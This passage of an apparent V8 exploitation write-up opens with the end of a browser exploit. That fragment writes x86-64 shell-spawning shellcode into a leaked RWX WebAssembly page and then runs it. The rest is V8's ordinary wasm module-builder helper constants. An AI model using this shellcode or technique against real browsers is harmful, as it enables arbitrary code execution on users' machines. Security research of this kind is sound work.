	  <span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">1</span>,<span class="hljs-number">126</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">112</span>,<span class="hljs-number">119</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">81</span>,<span class="hljs-number">1</span>,<span class="hljs-number">79</span>,<span class="hljs-number">0</span>,<span class="hljs-number">66</span>,<span class="hljs-number">200</span>,<span class="hljs-number">146</span>,<span class="hljs-number">158</span>,<span class="hljs-number">142</span>,<span class="hljs-number">163</span>,<span class="hljs-number">154</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">132</span>,<span class="hljs-number">196</span>,<span class="hljs-number">177</span>,<span class="hljs-number">143</span>,<span class="hljs-number">139</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">143</span>,<span class="hljs-number">138</span>,<span class="hljs-number">160</span>,<span class="hljs-number">202</span>,<span class="hljs-number">232</span>,<span class="hljs-number">152</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">200</span>,<span class="hljs-number">197</span>,<span class="hljs-number">145</span>,<span class="hljs-number">157</span>,<span class="hljs-number">200</span>,<span class="hljs-number">214</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">130</span>,<span class="hljs-number">252</span>,<span class="hljs-number">130</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">234</span>,<span class="hljs-number">208</span>,<span class="hljs-number">192</span>,<span class="hljs-number">132</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">66</span>,<span class="hljs-number">216</span>,<span class="hljs-number">158</span>,<span class="hljs-number">148</span>,<span class="hljs-number">128</span>,<span class="hljs-number">137</span>,<span class="hljs-number">146</span>,<span class="hljs-number">228</span>,<span class="hljs-number">245</span>,<span class="hljs-number">2</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">26</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">110</span>,<span class="hljs-number">97</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">112</span>,<span class="hljs-number">119</span>,<span class="hljs-number">110</span>
	]);
	<span class="hljs-keyword">const</span> mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_bytes);
	<span class="hljs-keyword">const</span> instance_shellcode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(mod);
	<span class="hljs-keyword">const</span> pwn = instance_shellcode.<span class="hljs-property">exports</span>.<span class="hljs-property">pwn</span>;

	<span class="hljs-keyword">var</span> shellcode = [
		<span class="hljs-number">0x6E69622FB848686An</span>,
		<span class="hljs-number">0xE7894850732F2F2Fn</span>,
		<span class="hljs-number">0x2434810101697268n</span>,
		<span class="hljs-number">0x6A56F63101010101n</span>,
		<span class="hljs-number">0x894856E601485E08n</span>,
		<span class="hljs-number">0x050F583B6AD231E6n</span>,
		<span class="hljs-number">0xFFFFFEC0E9909090n</span>
	];

	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0n</span>; i &lt; <span class="hljs-number">7n</span>; ++i) {
		<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(shellcode[i]);
		<span class="hljs-title function_">write64</span>(rwx_leak + i * <span class="hljs-number">8n</span>, shellcode[i]);
	}
	<span class="hljs-title class_">RandomLeak</span>();
})();
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js"><span class="hljs-comment">// Copyright 2016 the V8 project authors. All rights reserved.</span>
<span class="hljs-comment">// Use of this source code is governed by a BSD-style license that can be</span>
<span class="hljs-comment">// found in the LICENSE file.</span>

<span class="hljs-comment">// Used for encoding f32 and double constants to bits.</span>
<span class="hljs-keyword">let</span> byte_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">8</span>);
<span class="hljs-keyword">let</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(byte_view.<span class="hljs-property">buffer</span>);

<span class="hljs-comment">// The bytes function receives one of</span>
<span class="hljs-comment">//  - several arguments, each of which is either a number or a string of length</span>
<span class="hljs-comment">//    1; if it&#x27;s a string, the charcode of the contained character is used.</span>
<span class="hljs-comment">//  - a single array argument containing the actual arguments</span>
<span class="hljs-comment">//  - a single string; the returned buffer will contain the char codes of all</span>
<span class="hljs-comment">//    contained characters.</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">bytes</span>(<span class="hljs-params">...input</span>) {
  <span class="hljs-keyword">if</span> (input.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-keyword">typeof</span> input[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;array&#x27;</span>) input = input[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">if</span> (input.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-keyword">typeof</span> input[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;string&#x27;</span>) {
    <span class="hljs-keyword">let</span> len = input[<span class="hljs-number">0</span>].<span class="hljs-property">length</span>;
    <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(len);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) view[i] = input[<span class="hljs-number">0</span>].<span class="hljs-title function_">charCodeAt</span>(i);
    <span class="hljs-keyword">return</span> view.<span class="hljs-property">buffer</span>;
  }
  <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(input.<span class="hljs-property">length</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">let</span> val = input[i];
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> val == <span class="hljs-string">&#x27;string&#x27;</span>) {
      <span class="hljs-keyword">if</span> (val.<span class="hljs-property">length</span> != <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;string inputs must have length 1&#x27;</span>);
      }
      val = val.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>);
    }
    view[i] = val | <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">return</span> view.<span class="hljs-property">buffer</span>;
}

<span class="hljs-comment">// Header declaration constants</span>
<span class="hljs-keyword">var</span> kWasmH0 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmH1 = <span class="hljs-number">0x61</span>;
<span class="hljs-keyword">var</span> kWasmH2 = <span class="hljs-number">0x73</span>;
<span class="hljs-keyword">var</span> kWasmH3 = <span class="hljs-number">0x6d</span>;

<span class="hljs-keyword">var</span> kWasmV0 = <span class="hljs-number">0x1</span>;
<span class="hljs-keyword">var</span> kWasmV1 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmV2 = <span class="hljs-number">0</span>;
<span class="hljs-keyword">var</span> kWasmV3 = <span class="hljs-number">0</span>;

<span class="hljs-keyword">var</span> kHeaderSize = <span class="hljs-number">8</span>;
<span class="hljs-keyword">var</span> kPageSize = <span class="hljs-number">65536</span>;
<span class="hljs-keyword">var</span> kSpecMaxPages = <span class="hljs-number">65536</span>;
<span class="hljs-keyword">var</span> kMaxVarInt32Size = <span class="hljs-number">5</span>;
<span class="hljs-keyword">var</span> kMaxVarInt64Size = <span class="hljs-number">10</span>;
<span class="hljs-keyword">var</span> kSpecMaxFunctionParams = <span class="hljs-number">1_000</span>;

<span class="hljs-keyword">let</span> kDeclNoLocals = <span class="hljs-number">0</span>;

<span class="hljs-comment">// Section declaration constants</span>
<span class="hljs-keyword">let</span> kUnknownSectionCode = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kTypeSectionCode = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Function signature declarations</span>
<span class="hljs-keyword">let</span> kImportSectionCode = <span class="hljs-number">2</span>;      <span class="hljs-comment">// Import declarations</span>
<span class="hljs-keyword">let</span> kFunctionSectionCode = <span class="hljs-number">3</span>;    <span class="hljs-comment">// Function declarations</span>
<span class="hljs-keyword">let</span> kTableSectionCode = <span class="hljs-number">4</span>;       <span class="hljs-comment">// Indirect function table and other tables</span>
<span class="hljs-keyword">let</span> kMemorySectionCode = <span class="hljs-number">5</span>;      <span class="hljs-comment">// Memory attributes</span>
<span class="hljs-keyword">let</span> kGlobalSectionCode = <span class="hljs-number">6</span>;      <span class="hljs-comment">// Global declarations</span>
<span class="hljs-keyword">let</span> kExportSectionCode = <span class="hljs-number">7</span>;      <span class="hljs-comment">// Exports</span>
<span class="hljs-keyword">let</span> kStartSectionCode = <span class="hljs-number">8</span>;       <span class="hljs-comment">// Start function declaration</span>
<span class="hljs-keyword">let</span> kElementSectionCode = <span class="hljs-number">9</span>;     <span class="hljs-comment">// Elements section</span>
<span class="hljs-keyword">let</span> kCodeSectionCode = <span class="hljs-number">10</span>;       <span class="hljs-comment">// Function code</span>
<span class="hljs-keyword">let</span> kDataSectionCode = <span class="hljs-number">11</span>;       <span class="hljs-comment">// Data segments</span>
<span class="hljs-keyword">let</span> kDataCountSectionCode = <span class="hljs-number">12</span>;  <span class="hljs-comment">// Data segment count (between Element &amp; Code)</span>
<span class="hljs-keyword">let</span> kTagSectionCode = <span class="hljs-number">13</span>;        <span class="hljs-comment">// Tag section (between Memory &amp; Global)</span>
<span class="hljs-keyword">let</span> kStringRefSectionCode = <span class="hljs-number">14</span>;  <span class="hljs-comment">// Stringref literals section (between Tag &amp; Global)</span>
<span class="hljs-keyword">let</span> kLastKnownSectionCode = <span class="hljs-number">14</span>;

<span class="hljs-comment">// Name section types</span>
<span class="hljs-keyword">let</span> kModuleNameCode = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kFunctionNamesCode = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kLocalNamesCode = <span class="hljs-number">2</span>;

<span class="hljs-keyword">let</span> kWasmSharedTypeForm = <span class="hljs-number">0x65</span>;
<span class="hljs-keyword">let</span> kWasmFunctionTypeForm = <span class="hljs-number">0x60</span>;
<span class="hljs-keyword">let</span> kWasmStructTypeForm = <span class="hljs-number">0x5f</span>;
<span class="hljs-keyword">let</span> kWasmArrayTypeForm = <span class="hljs-number">0x5e</span>;
<span class="hljs-keyword">let</span> kWasmContTypeForm = <span class="hljs-number">0x5d</span>;
<span class="hljs-keyword">let</span> kWasmSubtypeForm = <span class="hljs-number">0x50</span>;
<span class="hljs-keyword">let</span> kWasmSubtypeFinalForm = <span class="hljs-number">0x4f</span>;
<span class="hljs-keyword">let</span> kWasmRecursiveTypeGroupForm = <span class="hljs-number">0x4e</span>;
<span class="hljs-keyword">let</span> kWasmDescriptorTypeForm = <span class="hljs-number">0x4d</span>;
<span class="hljs-keyword">let</span> kWasmDescribesTypeForm = <span class="hljs-number">0x4c</span>;

<span class="hljs-keyword">let</span> kNoSuperType = <span class="hljs-number">0xFFFFFFFF</span>;

<span class="hljs-keyword">let</span> kLimitsNoMaximum = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kLimitsWithMaximum = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kLimitsSharedNoMaximum = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kLimitsSharedWithMaximum = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64NoMaximum = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64WithMaximum = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64SharedNoMaximum = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kLimitsMemory64SharedWithMaximum = <span class="hljs-number">0x07</span>;

<span class="hljs-comment">// Segment flags</span>
<span class="hljs-keyword">let</span> kActiveNoIndex = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kPassive = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kActiveWithIndex = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kDeclarative = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kPassiveWithElements = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> kDeclarativeWithElements = <span class="hljs-number">7</span>;

<span class="hljs-comment">// Function declaration flags</span>
<span class="hljs-keyword">let</span> kDeclFunctionName = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kDeclFunctionImport = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kDeclFunctionLocals = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kDeclFunctionExport = <span class="hljs-number">0x08</span>;

<span class="hljs-comment">// Value types and related</span>
<span class="hljs-keyword">let</span> kWasmVoid = <span class="hljs-number">0x40</span>;
<span class="hljs-keyword">let</span> kWasmI32 = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kWasmI64 = <span class="hljs-number">0x7e</span>;
<span class="hljs-keyword">let</span> kWasmF32 = <span class="hljs-number">0x7d</span>;
<span class="hljs-keyword">let</span> kWasmF64 = <span class="hljs-number">0x7c</span>;
<span class="hljs-keyword">let</span> kWasmS128 = <span class="hljs-number">0x7b</span>;
<span class="hljs-keyword">let</span> kWasmI8 = <span class="hljs-number">0x78</span>;
<span class="hljs-keyword">let</span> kWasmI16 = <span class="hljs-number">0x77</span>;
<span class="hljs-keyword">let</span> kWasmF16 = <span class="hljs-number">0x76</span>;

<span class="hljs-comment">// These are defined as negative integers to distinguish them from positive type</span>
<span class="hljs-comment">// indices.</span>
<span class="hljs-keyword">let</span> kWasmNullFuncRef = -<span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kWasmNullExternRef = -<span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kWasmNullRef = -<span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kWasmFuncRef = -<span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kWasmAnyFunc = kWasmFuncRef;  <span class="hljs-comment">// Alias named as in the JS API spec</span>
<span class="hljs-keyword">let</span> kWasmExternRef = -<span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kWasmAnyRef = -<span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kWasmEqRef = -<span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kWasmI31Ref = -<span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kWasmStructRef = -<span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kWasmArrayRef = -<span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kWasmExnRef = -<span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kWasmNullExnRef = -<span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kWasmStringRef = -<span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kWasmStringViewWtf8 = -<span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kWasmStringViewWtf16 = -<span class="hljs-number">0x20</span>;
<span class="hljs-keyword">let</span> kWasmStringViewIter = -<span class="hljs-number">0x1f</span>;
<span class="hljs-keyword">const</span> kWasmContRef = -<span class="hljs-number">0x18</span>;
<span class="hljs-keyword">const</span> kWasmNullContRef = -<span class="hljs-number">0x0b</span>;

<span class="hljs-comment">// Use the positive-byte versions inside function bodies.</span>
<span class="hljs-keyword">let</span> kLeb128Mask = <span class="hljs-number">0x7f</span>;
<span class="hljs-keyword">let</span> kFuncRefCode = kWasmFuncRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kAnyFuncCode = kFuncRefCode;  <span class="hljs-comment">// Alias named as in the JS API spec</span>
<span class="hljs-keyword">let</span> kExternRefCode = kWasmExternRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kAnyRefCode = kWasmAnyRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kEqRefCode = kWasmEqRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kI31RefCode = kWasmI31Ref &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullExternRefCode = kWasmNullExternRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullFuncRefCode = kWasmNullFuncRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStructRefCode = kWasmStructRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kArrayRefCode = kWasmArrayRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kExnRefCode = kWasmExnRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullExnRefCode = kWasmNullExnRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kNullRefCode = kWasmNullRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringRefCode = kWasmStringRef &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewWtf8Code = kWasmStringViewWtf8 &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewWtf16Code = kWasmStringViewWtf16 &amp; kLeb128Mask;
<span class="hljs-keyword">let</span> kStringViewIterCode = kWasmStringViewIter &amp; kLeb128Mask;
<span class="hljs-keyword">const</span> kContRefCode = kWasmContRef &amp; kLeb128Mask;
<span class="hljs-keyword">const</span> kNullContRefCode = kWasmNullContRef &amp; kLeb128Mask;

<span class="hljs-keyword">let</span> kWasmRefNull = <span class="hljs-number">0x63</span>;
<span class="hljs-keyword">let</span> kWasmRef = <span class="hljs-number">0x64</span>;
<span class="hljs-keyword">let</span> kWasmExact = <span class="hljs-number">0x62</span>;

<span class="hljs-comment">// Implementation detail of `wasmRef[Null]Type`, don&#x27;t use directly.</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefTypeBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">opcode, heap_type</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">opcode</span> = opcode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap_type</span> = heap_type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_exact</span> = <span class="hljs-literal">false</span>;
  }
  <span class="hljs-title function_">nullable</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">opcode</span> = kWasmRefNull;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  <span class="hljs-title function_">shared</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
  <span class="hljs-title function_">exact</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_exact</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmRefNullType</span>(<span class="hljs-params">heap_type</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefTypeBuilder</span>(kWasmRefNull, heap_type);
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasmRefType</span>(<span class="hljs-params">heap_type</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefTypeBuilder</span>(kWasmRef, heap_type);
}

<span class="hljs-keyword">let</span> kExternalFunction = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kExternalTable = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kExternalMemory = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kExternalGlobal = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kExternalTag = <span class="hljs-number">4</span>;
<span class="hljs-keyword">let</span> kExternalExactFunction = <span class="hljs-number">32</span>;

<span class="hljs-keyword">let</span> kTableZero = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kMemoryZero = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kSegmentZero = <span class="hljs-number">0</span>;

<span class="hljs-keyword">let</span> kExceptionAttribute = <span class="hljs-number">0</span>;

<span class="hljs-keyword">const</span> kAtomicSeqCst = <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> kAtomicAcqRel = <span class="hljs-number">1</span>;

<span class="hljs-comment">// Useful signatures</span>
<span class="hljs-keyword">let</span> kSig_i_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_l_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_i_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_iii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_l_iiii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32, kWasmI32], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_l_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_f_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_i_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_i_ff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_f_ff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_f_ffff = <span class="hljs-title function_">makeSig</span>([kWasmF32, kWasmF32, kWasmF32, kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_dddd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64, kWasmF64, kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_l_ll = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_l_llll = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI64, kWasmI64, kWasmI64], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_i_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_v = <span class="hljs-title function_">makeSig</span>([], []);
<span class="hljs-keyword">let</span> kSig_i_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_l_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI64]);
<span class="hljs-keyword">let</span> kSig_f_v = <span class="hljs-title function_">makeSig</span>([], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_v = <span class="hljs-title function_">makeSig</span>([], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_v_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_iii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_l = <span class="hljs-title function_">makeSig</span>([kWasmI64], []);
<span class="hljs-keyword">let</span> kSig_v_li = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_lii = <span class="hljs-title function_">makeSig</span>([kWasmI64, kWasmI32, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_v_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], []);
<span class="hljs-keyword">let</span> kSig_v_dd = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64], []);
<span class="hljs-keyword">let</span> kSig_v_ddi = <span class="hljs-title function_">makeSig</span>([kWasmF64, kWasmF64, kWasmI32], []);
<span class="hljs-keyword">let</span> kSig_ii_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_v = <span class="hljs-title function_">makeSig</span>([], [kWasmI32, kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_ii_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_ii_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32, kWasmI32]);
<span class="hljs-keyword">let</span> kSig_iii_ii = <span class="hljs-title function_">makeSig</span>([kWasmI32, kWasmI32], [kWasmI32, kWasmI32, kWasmI32]);

<span class="hljs-keyword">let</span> kSig_v_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], []);
<span class="hljs-keyword">let</span> kSig_f_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_f_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], [kWasmF32]);
<span class="hljs-keyword">let</span> kSig_d_d = <span class="hljs-title function_">makeSig</span>([kWasmF64], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_f = <span class="hljs-title function_">makeSig</span>([kWasmF32], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_d_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmF64]);
<span class="hljs-keyword">let</span> kSig_r_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], [kWasmExternRef]);
<span class="hljs-keyword">let</span> kSig_a_a = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc], [kWasmAnyFunc]);
<span class="hljs-keyword">let</span> kSig_i_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], [kWasmI32]);
<span class="hljs-keyword">let</span> kSig_v_r = <span class="hljs-title function_">makeSig</span>([kWasmExternRef], []);
<span class="hljs-keyword">let</span> kSig_v_a = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc], []);
<span class="hljs-keyword">let</span> kSig_v_rr = <span class="hljs-title function_">makeSig</span>([kWasmExternRef, kWasmExternRef], []);
<span class="hljs-keyword">let</span> kSig_v_aa = <span class="hljs-title function_">makeSig</span>([kWasmAnyFunc, kWasmAnyFunc], []);
<span class="hljs-keyword">let</span> kSig_r_v = <span class="hljs-title function_">makeSig</span>([], [kWasmExternRef]);
<span class="hljs-keyword">let</span> kSig_a_v = <span class="hljs-title function_">makeSig</span>([], [kWasmAnyFunc]);
<span class="hljs-keyword">let</span> kSig_a_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmAnyFunc]);
